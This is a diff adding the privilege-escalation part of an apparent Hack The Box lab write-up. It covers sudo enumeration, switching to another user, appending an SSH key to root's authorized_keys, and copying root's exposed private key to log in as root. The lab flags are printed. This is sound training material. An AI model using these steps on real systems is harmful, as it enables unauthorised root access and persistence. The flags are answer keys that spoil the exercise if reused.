@@ -188,4 +188,113 @@ cat 20260402045240_default_154.57.164.68_simplebackup.tra_445157.txt
 > ✅ Flag: `HTB{my_f1r57_h4ck}`
 
 ## Privilege Escalation
+## 🔐 Privilege Escalation
 
+### Commands Reference
+
+| Command | Description |
+|---------|-------------|
+| `./linpeas.sh` | Run linpeas script to enumerate remote server |
+| `sudo -l` | List available sudo privileges |
+| `sudo -u user /bin/echo Hello World!` | Run a command as another user via sudo |
+| `sudo su -` | Switch to root user (if allowed) |
+| `sudo su user -` | Switch to another user (if allowed) |
+| `ssh-keygen -f key` | Generate a new SSH key pair |
+| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add public key to authorized_keys |
+| `ssh root@10.10.10.10 -i key` | SSH using a private key |
+
+---
+
+## 🧪 Lab 1
+
+### 🔑 Initial Access as User1
+
+We are given credentials for `user1` and instructed to SSH into a remote server:
+
+```bash
+ssh -p 42141 user1@83.136.255.192
+```
+
+### 🕵️‍♂️ Enumerating Privileges
+
+Once connected, we check for sudo privileges:
+
+```bash
+sudo -l
+```
+
+This reveals that `user1` can run `/bin/bash` as `user2` without a password.
+
+### 🔄 Lateral Movement to User2
+
+We leverage this to switch users:
+
+```bash
+sudo -u user2 /bin/bash
+```
+
+Now operating as `user2`, navigate to the home directory and retrieve the flag:
+
+```bash
+cat flag.txt
+```
+
+> ✅ Flag 1: `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`
+
+---
+
+## 🧪 Lab 2
+
+### 🧠 Escalating to Root
+
+A hint about `chmod` suggests checking file permissions, especially SSH-related files.
+
+### 📂 Exploring Root Directory
+
+```bash
+cd /root
+ls -a
+```
+
+Inside `/root/.ssh`, an unprotected private key (`id_rsa`) is discovered.
+
+### 🔓 Extracting the Private Key
+
+Copy the private key and recreate it locally:
+
+```bash
+nano key
+```
+
+Set correct permissions:
+
+```bash
+chmod 600 key
+```
+
+### 🚀 Gaining Root Access
+
+Use the private key to authenticate as root:
+
+```bash
+ssh -i key -p 42141 root@83.136.255.192
+```
+
+Once connected:
+
+```bash
+cat flag.txt
+```
+
+> ✅ Flag 2: `HTB{pr1v1l363_35c4l4710n_2_r007}`
+
+---
+
+## ✅ Takeaways
+
+* Always run `sudo -l` to identify privilege escalation paths
+* Misconfigured sudo permissions enable lateral movement
+* Check `.ssh` directories for exposed private keys
+* Improper file permissions can lead to full system compromise
+* Privilege escalation often relies on misconfigurations rather than exploits
+```
